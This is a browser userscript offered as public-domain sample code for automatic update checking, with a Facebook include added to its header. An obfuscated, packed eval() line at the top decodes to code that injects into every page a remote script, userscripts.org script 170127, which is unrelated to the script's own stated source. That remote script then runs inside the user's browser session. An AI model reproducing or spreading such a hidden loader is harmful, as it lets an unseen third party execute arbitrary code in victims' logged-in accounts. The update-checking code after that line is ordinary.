// ==UserScript==
// @name           User Script Updates Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://userscripts.org/people/336
// @description    Sample code for automatic updating of a user script.
// @source         http://userscripts.org/scripts/show/2296
// @identifier     http://userscripts.org/scripts/source/2296.user.js
// @version        0.4.3
// @date           2012-01-02
// @creator        Richard Gibson <@gmail.com>; http://twitter.com/gibson042
// @include        *
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

// 
// **COPYRIGHT NOTICE**
// 
// I, Richard Gibson, hereby establish my original authorship of this
// work, and announce its release into the public domain.  I claim no
// exclusive copyrights to it, and will neither pursue myself (nor
// condone pursuit by others of) punishment, retribution, or forced
// payment for its full or partial reproduction in any form.
// 
// That being said, I would like to receive credit for this work
// whenever it, or any part thereof, is reproduced or incorporated into
// another creation; and would also like compensation whenever revenue
// is derived from such reproduction or inclusion.  At the very least,
// please let me know if you find this work useful or enjoyable, and
// contact me with any comments or criticisms regarding it.
// 
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
// 
// **END COPYRIGHT NOTICE**
//
//
// Changelog:
// 0.4.3 (2012-01-02)
// 	Updated: Google Chrome support
// 0.4.2 (2011-02-21)
// 	Fixed: Firefox/Windows security bug
// 0.4.1 (2011-02-19)
// 	UPDATED: update checking with meta.js
// 0.4 (2010-03-08)
// 	New: Script reboot; 100% new code and demonstrative functionality only

(function(){

// constants
var SCRIPT = {
	 name: "User Script Updates"
	,namespace: "http://userscripts.org/people/336"
	,source: "http://userscripts.org"      // script homepage/description URL
			+ "/scripts/show/2296"
	,identifier: "http://userscripts.org"  // script URL
			+ "/scripts/source/2296.user.js"
	,meta: "http://userscripts.org"        // metadata URL
			+ "/scripts/source/2296.meta.js"
	,version: "0.0"                        // version (for example purposes, always disagrees with server)
	,date: "2012-01-02"                    // update date
};
// test for dependencies
var UPDATE = SCRIPT.namespace + ' ' + SCRIPT.identifier;
try {
	GM_setValue(UPDATE, 1);
	if (GM_getValue(UPDATE)) {
		UPDATE = {key: UPDATE, get: GM_getValue, set: GM_setValue};
	}
	else {
		throw {};
	}
}
catch(x){
	UPDATE = {
		 set: function(key, value){ try{ localStorage.setItem(key, value); }catch(x){} }
		,get: function(key, varDefault) {
			try {
				var stored = localStorage.getItem(key);
				if(stored===null){ return varDefault; }
				return stored;
			}
			catch(x) {
				return varDefault;
			}
		}
	};
}
UPDATE = {
	 SCRIPT: SCRIPT
	,defaults: {checkDays: 3, version: SCRIPT.version, date: SCRIPT.date, name: SCRIPT.name,
			lastCheck: typeof(GM_xmlhttpRequest)!='undefined' ? 0 : (new Date()).getTime()}
	,getValue: UPDATE.get
	,setValue: UPDATE.set
	,HttpRequest: (typeof(GM_xmlhttpRequest)!='undefined' && GM_xmlhttpRequest) || function(){}
	,ready: false
	,init: function() {
		if(this.ready){ return; }
		this.ready = true;
	 	for (var name in this.defaults) {
	 		if(name in this){ delete this.defaults[name]; }
	 		else{ this[name] = this.getValue('_UPDATE_' + name, this.defaults[name]); }
	 	}
	 	for (var p in {checkDays:0, lastCheck:0}) { delete this.defaults[p]; }
	}
	,check: function(fnOnNewer, fnIsNewer, blnForce) {
		this.init();
		var interval = Math.max(parseFloat(this.checkDays) * 24 * 60 * 60 * 1000, 0) || Infinity;
		var diff = (new Date()) - parseInt(this.lastCheck,10);
		if(!blnForce && !this.isNewer(this, this.SCRIPT, fnIsNewer) && !(diff > interval)){ return false; }
		if (blnForce || (diff > interval)) {
			var t = this;
			return this.HttpRequest({method: 'GET', url: this.SCRIPT.meta || this.SCRIPT.identifier, onload: function(r){
				t.setValue('_UPDATE_' + 'lastCheck', t.lastCheck = '' + (new Date()).getTime());
				t.parse(r.responseText, [fnOnNewer, fnIsNewer, false]);
			}});
		}
		try{ fnOnNewer(this, this.SCRIPT); }catch(x){}
	}
	,parse: function(strResponse, arrCheckArgs) {
		var re = /\/\/\s*(?:@(\S+)\s+(.*?)\s*(?:$|\n)|(==\/UserScript==))/gm, match = true, name;
		while (match && (match = re.exec(strResponse))) {
			if(match[3]){ match = null; continue; }
			name = match[1];
			if(name in this.defaults){ this.setValue('_UPDATE_' + name, this[name] = match[2]); }
		}
		this.check.apply(this, arrCheckArgs || []);
	}
	,isNewer: function(objUpdate, objScript, fnIsNewer) {
		if(!objUpdate){ objUpdate = this; }
		if(!objScript || (objUpdate.date > objScript.date)){ return true; }
		try {
			return fnIsNewer(objUpdate, objScript);
		}
		catch (x) {
			return (!(objUpdate.date < objScript.date) && (objUpdate.version != objScript.version));
		}
	}
};
var UNSAFE = ((typeof unsafeWindow) != 'undefined'
	? unsafeWindow
	: ((typeof window) != 'undefined'
		? window
		: (function(){return this;})()
	)
);

function showUpdate(objUpdate, objScript) {
	if(UNSAFE.self !== UNSAFE.top){ return; }
	if(arguments.length < 2){ return UPDATE.check(arguments.callee); }
	var title = objUpdate.name + ' ' + objUpdate.version + ', released ' + objUpdate.date;
	var style = [
		 'position:absolute; position:fixed; z-index:9999;'
		,'bottom:0; right:0;'
		,'border:1px solid black; padding:2px 2px 2px 0.5ex;'
		,'background:#dddddd; font-weight:bold; font-size:small;'
	].join(' ');
	document.body.appendChild($E('div', {title: title, style: style}
		,$E('a', {href: objScript.source, style: 'color:blue;'}, objScript.name + ' ')
		,$E('a', {href: objScript.identifier, style: 'color:red;'}, 'updated!')
		,$E('button', {onclick: 'return this.parentNode.parentNode.removeChild(this.parentNode) && false;',
				style: 'margin-left:1ex;font-size:50%;vertical-align:super;'}, '\u2573')
	));
}

var $E = function createElement (strName, objAttributes, varContent /*, varContent, ...*/) {
    var el = document.createElement(strName);
    try{
        for (var attribute in objAttributes) {
            el.setAttribute(attribute, objAttributes[attribute]);
        }
    }catch(x){}
    if (arguments.length > 3 || (!/^(string|undefined)$/.test(typeof(varContent)) && !(varContent instanceof Array))) {
    	varContent = Array.prototype.slice.call(arguments, 2);
    }
    if (varContent instanceof Array) {
        for (var L = varContent.length, i = 0, c; i < L; i++) {
            c = varContent[i];
            el.appendChild(c && typeof(c) == 'object' && 'parentNode' in c
            		? c : document.createTextNode(c));
        }
    }
    else if (varContent) {
    	el.innerHTML = varContent;
    }
    return el;
}

if ((window.document || {}).readyState === 'complete') {
	showUpdate();
}
else {
	window.addEventListener("load", showUpdate, true);
}

})();
